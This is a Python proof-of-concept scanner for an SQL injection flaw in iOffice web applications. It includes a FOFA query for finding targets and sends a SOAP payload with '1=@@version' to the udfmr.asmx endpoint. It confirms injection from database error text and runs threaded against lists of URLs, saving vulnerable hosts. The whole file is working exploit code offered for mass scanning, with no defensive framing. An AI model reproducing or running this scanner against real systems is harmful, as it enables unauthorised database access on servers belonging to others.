#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# fofa: body="./iOffice/prg/welcome/GetBoxyStatus.ashx?mode=login" 

import os
import time
from urllib import response
from urllib.parse import urljoin
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()

        if self.args.file:
            self.init()
            self.urlList = self.loadURL()  # 所有目标
            self.multiRun()
            self.start = time.time()
        else:
            self.verfyurl()  #单个目标
    #banner信息
    def banner(self):
        logo = r"""
  _  ____   __  __ _                      _  __                            _             _       
 (_)/ __ \ / _|/ _(_)                    | |/ _|                          | |           | |      
  _| |  | | |_| |_ _  ___ ___   _   _  __| | |_ _ __ ___  _ __   ___  __ _| |_   ___   _| |_ __  
 | | |  | |  _|  _| |/ __/ _ \ | | | |/ _` |  _| '_ ` _ \| '__| / __|/ _` | \ \ / / | | | | '_ \ 
 | | |__| | | | | | | (_|  __/ | |_| | (_| | | | | | | | | |    \__ \ (_| | |\ V /| |_| | | | | |
 |_|\____/|_| |_| |_|\___\___|  \__,_|\__,_|_| |_| |_| |_|_|    |___/\__, |_| \_/  \__,_|_|_| |_|
                                                                        | |                      
                                                                        |_|    
                                                                        author： Sweelg
                                                                        GitHub： https://github.com/Sweelg                 
        """
        print("\033[91m" + logo + "\033[0m")
    #解析器
    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. url.txt)")
        parser.add_argument("-f", "--file", required=False, type=str, help=f"Target file(e.g. url.txt)")
        parser.add_argument("-t", "--thread", required=False, type=int, default=5, help=f"Number of thread (default 5)")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout (default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help=f"Vuln url output file (e.g. result.txt)")
        return parser.parse_args()
    #file初始化
    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")
    #多目标验证
    def verify(self, url):
            repData = self.respose(url)
            if "nvarchar" in repData:
                msg = "[+] 漏洞存在！！！[✅] url: {}".format(url)
                self.lock.acquire()
                try:
                    self.findCount +=1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            elif "conn" in repData:
                msg = "[-] URL连接失败！ [-] url: {}".format(url)
            else:
                msg = "[x] 未检测到漏洞！[x] url: {}".format(url)
            self.lock.acquire()
            try:
                print(msg)
            finally:
                self.lock.release()
    #poc响应
    def respose(self, url):
        path = "/iOffice/prg/set/wss/udfmr.asmx"
        url = urljoin(url, path)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        
            "Content-Type": "text/xml; charset=utf-8"
        }
        data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope 	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr"> <condition>1=@@version</condition>
</GetEmpSearch>
</soap:Body>
</soap:Envelope>
        '''
        try:
            response = requests.post(url, headers=headers, data=data, timeout=self.args.timeout, verify=False)
            resp = response.text
            return resp
        except:
            return "conn"        
    # 读取file文件
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for u in f.readlines():
                u = u.strip()
                urlList.append(u)
        return urlList
    #单个url验证
    def verfyurl(self):
        url = self.args.url
        repData = self.respose(url)
        if "nvarchar" in repData:
            print("[+] 漏洞存在！！！[✅] url: {}".format(url))        
        elif "conn" in repData:
            print("[-] URL连接失败！ [-] url: {}".format(url))
        else:
            print("[x] 未检测到漏洞！[x] url: {}".format(url))
        

    # 多线程
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        if self.args.url:
            executor.map(self.verify, self.url)
        else:
            executor.map(self.verify, self.urlList)

    # 输出
    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")
    #析构释放
    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()
